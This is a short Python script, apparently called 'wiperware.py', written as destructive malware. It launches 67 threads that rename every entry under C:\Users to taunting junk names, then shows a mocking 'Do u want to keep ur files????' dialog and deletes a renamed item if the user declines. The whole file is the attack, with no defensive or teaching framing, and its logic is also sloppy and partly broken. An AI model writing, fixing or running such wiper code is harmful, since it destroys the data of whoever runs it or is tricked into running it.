import os
import threading
import getpass
from pathlib import Path
import time
import tkinter as tk
from tkinter import messagebox

def wipe():
    root = tk.Tk()
    root.withdraw()
    name = getpass.getuser()
    ordner = Path(rf"C:\Users") # enter your path
    files = []

    for file in ordner.iterdir():
        if file == "wiperware.py":
            continue
        files.append(file)
    
    for i,file in enumerate(files):
        fajl = os.path.basename(file)
        replaced = Path(str(file).replace(fajl, f"xaxaxa сикссевен{i}.txt"))
        os.rename(file, replaced)

    result = messagebox.askyesno("xxaaxaxaxaxaaxaxaxaxaxaxaxaxaxaxaxax",message="Do u want to keep ur files????")
    if result:
        messagebox.showwarning(message="Keep them:)")
    else:
        os.remove(replaced)

threads = 67

for _ in range(threads):
    threading.Thread(target=wipe).start()



